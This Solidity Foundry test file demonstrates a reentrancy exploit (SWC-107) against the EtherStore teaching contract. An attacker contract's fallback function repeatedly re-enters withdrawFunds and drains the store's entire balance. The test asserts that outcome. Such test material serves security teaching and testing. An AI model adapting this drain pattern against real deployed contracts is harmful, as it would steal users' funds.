// SPDX-License-Identifier: MIT
pragma abicoder v2;
pragma solidity ^0.7.4;

import {Test, console2, stdError, DSTest} from "forge-std/Test.sol";
import {EtherStore} from "swc_107/EtherStore.sol";

contract ContractTest is Test {
    EtherStore store;
    EtherStoreAttack attack;

    function setUp() public {
        store = new EtherStore();
        attack = new EtherStoreAttack(address(store));
    }

    function test_onlyReentrancy() public {
        //Precondition, init the contract balance to 1 ETH
        vm.deal(address(store), 2 ether);
        vm.deal(address(attack), 1 ether);

        //Step 1: deposit some Ether
        assertEq(address(store).balance, 2 ether);
        vm.prank(address(attack));
        store.deposit{value: 1 ether}();
        assertEq(address(store).balance, 3 ether);
        assertEq(address(attack).balance, 0 ether);

        //Step 2: exploit
        vm.expectCall(address(store), 0 ether, abi.encodeWithSelector(store.withdrawFunds.selector, 1 ether), 3);
        attack.Attack(); // exploit here

        //Postcondition
        assertEq(address(store).balance, 0 ether);
        assertEq(address(attack).balance, 3 ether);
    }
}

contract EtherStoreAttack is DSTest {
    EtherStore store;
    
    constructor(address _store) public {
        store = EtherStore(_store);
    }
    
    function Attack() public {
        store.withdrawFunds(1 ether);   // exploit here
    }
    
    fallback() external payable {
        emit log_named_decimal_uint("EtherStore balance", address(store).balance, 18);
        emit log_named_decimal_uint("Attacker balance", address(this).balance, 18);
        if (address(store).balance >= 1 ether) {
            emit log_string("Reenter");
            store.withdrawFunds(1 ether);   // exploit here
        }
    }
}